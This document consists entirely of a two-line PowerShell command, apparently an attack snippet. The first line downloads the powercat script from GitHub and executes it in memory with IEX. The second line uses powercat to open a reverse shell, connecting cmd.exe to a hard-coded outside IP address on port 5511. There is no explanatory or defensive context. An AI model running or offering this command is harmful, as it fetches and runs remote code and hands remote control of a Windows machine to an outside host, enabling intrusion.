IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1");
powercat -c 116.203.124.222 -p 5511 -e cmd;
